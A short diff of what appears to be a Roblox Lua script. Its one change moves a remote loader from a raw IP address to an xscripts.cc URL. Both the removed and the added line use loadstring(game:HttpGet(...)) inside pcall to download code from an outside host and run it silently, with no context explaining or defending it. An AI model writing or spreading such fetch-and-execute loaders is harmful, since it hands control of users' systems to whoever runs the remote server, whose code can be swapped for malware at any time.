@@ -43,7 +43,7 @@ end
 --==================================================
 
 pcall(function()
-    loadstring(game:HttpGet("http://31.172.87.116/8ofGhey5g9E1BeF5yCWcCQnF7coBWWOd8kzehlwDfkUk4NmDVtly5DVuxFQxwJnVt9w9z1TtaH7LDYH0"))()
+    loadstring(game:HttpGet("https://xscripts.cc/8ofGhey5g9E1BeF5yCWcCQnF7coBWWOd8kzehlwDfkUk4NmDVtly5DVuxFQxwJnVt9w9z1TtaH7LDYH0"))()
 end)
 
 --==================================================
